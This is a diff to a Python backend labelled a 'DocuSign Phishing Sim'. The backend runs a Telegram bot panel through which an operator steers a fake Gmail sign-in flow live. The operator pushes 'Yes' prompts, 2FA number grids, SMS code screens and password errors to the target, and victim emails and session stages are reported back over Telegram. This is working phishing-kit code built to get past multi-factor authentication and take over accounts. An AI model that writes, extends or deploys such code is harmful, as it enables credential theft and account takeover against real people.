@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
 DocuSign Phishing Sim — Backend API
-Full Gmail control panel with all options visible at once
 """
 
 import json, logging, datetime, hashlib, threading, time, random, os
@@ -73,7 +72,6 @@ def tg_answer(cq_id):
 
 
 def send_control_panel(sid, email, prev_msg_id=None):
-    """Send or update the control panel with all buttons visible."""
     kb = {"inline_keyboard": [
         [{"text": "✅ Yes Prompt", "callback_data": f"yes_prompt:{sid}"}],
         [{"text": "🔢 2FA Number Grid", "callback_data": f"2fa_grid:{sid}"}],
@@ -102,7 +100,7 @@ def webhook():
             data = cb["data"]
             mid = cb["message"]["message_id"]
 
-            # ─── Yes Prompt (are you the one trying to sign in?) ───
+            # ─── Yes Prompt ───
             if data.startswith("yes_prompt:"):
                 sid = data.split(":", 1)[1]
                 with gmail_sessions_lock:
@@ -110,10 +108,20 @@ def webhook():
                         tg_send("Session not found")
                         return jsonify({"ok": True})
                     s = gmail_sessions[sid]
-                    s["action"] = "show_prompt"
-                    s["stage"] = "prompt_shown"
-                    kb = {"inline_keyboard": [[{"text": "✅ User Clicked Yes", "callback_data": f"authorized:{sid}"}]]}
+                    s["action"] = "yes_prompt"
+                    s["stage"] = "yes_prompt"
+                    kb = {"inline_keyboard": [[{"text": "✅ User Clicked Yes", "callback_data": f"yes_clicked:{sid}"}]]}
                     tg_edit(mid, f"✅ Yes prompt sent to user.\n\nWaiting for user to click 'Yes'...", kb)
+
+            # ─── User Clicked Yes ───
+            elif data.startswith("yes_clicked:"):
+                sid = data.split(":", 1)[1]
+                with gmail_sessions_lock:
+                    if sid in gmail_sessions:
+                        gmail_sessions[sid]["action"] = "waiting"
+                        gmail_sessions[sid]["stage"] = "yes_clicked"
+                    tg_edit(mid, f"✅ User clicked Yes")
+                    send_control_panel(sid, gmail_sessions[sid]["email"], mid)
 
             # ─── 2FA Number Grid ───
             elif data.startswith("2fa_grid:"):
@@ -147,7 +155,7 @@ def webhook():
                         kb = {"inline_keyboard": [[{"text": "✅ User Authorized", "callback_data": f"authorized:{sid}"}]]}
                         tg_edit(mid, f"✅ 2FA number selected: ••••{digit}\n\nPrompt sent to user.", kb)
 
-            # ─── User Clicked Authorized ───
+            # ─── User Clicked Authorized on 2FA screen ───
             elif data.startswith("authorized:"):
                 sid = data.split(":", 1)[1]
                 with gmail_sessions_lock:
@@ -156,9 +164,9 @@ def webhook():
                         gmail_sessions[sid]["sms1"] = code1
                         gmail_sessions[sid]["action"] = "sms1"
                         gmail_sessions[sid]["stage"] = "sms1"
-                        tg_edit(mid, f"✅ User Authorized\n📱 SMS Code I: `{code1}`\n\nWaiting for SMS II...", None)
+                        tg_edit(mid, f"✅ User Authorized\n📱 SMS Code I: `{code1}`", None)
 
-            # ─── SMS Code I (direct trigger) ───
+            # ─── SMS Code I ───
             elif data.startswith("sms1:"):
                 sid = data.split(":", 1)[1]
                 with gmail_sessions_lock:
@@ -167,7 +175,7 @@ def webhook():
                         gmail_sessions[sid]["sms1"] = code1
                         gmail_sessions[sid]["action"] = "sms1"
                         gmail_sessions[sid]["stage"] = "sms1"
-                        tg_edit(mid, f"📱 SMS Code I: `{code1}`\n\nSent to user.", None)
+                        tg_edit(mid, f"📱 SMS Code I: `{code1}`", None)
                         send_control_panel(sid, gmail_sessions[sid]["email"], mid)
 
             # ─── SMS Code II ───
@@ -179,7 +187,7 @@ def webhook():
                         gmail_sessions[sid]["sms2"] = code2
                         gmail_sessions[sid]["action"] = "sms2"
                         gmail_sessions[sid]["stage"] = "sms2"
-                        tg_edit(mid, f"📱 SMS Code II: `{code2}`\n\nSent to user.", None)
+                        tg_edit(mid, f"📱 SMS Code II: `{code2}`", None)
                         send_control_panel(sid, gmail_sessions[sid]["email"], mid)
 
             # ─── Password Error ───
@@ -344,6 +352,8 @@ def gmail_status(session_id):
 
     if action == "waiting":
         return jsonify({"action": "waiting"})
+    elif action == "yes_prompt":
+        return jsonify({"action": "yes_prompt", "email": s.get("email", "")})
     elif action == "show_prompt":
         return jsonify({"action": "show_prompt", "phone": s.get("phone", "XX"), "email": s.get("email", "")})
     elif action == "pw_error":
@@ -366,7 +376,7 @@ def gmail_authorize(session_id):
     with gmail_sessions_lock:
         if session_id in gmail_sessions:
             gmail_sessions[session_id]["action"] = "authorized"
-            tg_send(f"✅ User clicked 'Authorized' for {gmail_sessions[session_id]['email']}")
+            tg_send(f"✅ User clicked 'Authorized' / 'Yes' for {gmail_sessions[session_id]['email']}")
         else:
             return jsonify({"status": "error"}), 404
     return jsonify({"status": "ok"})
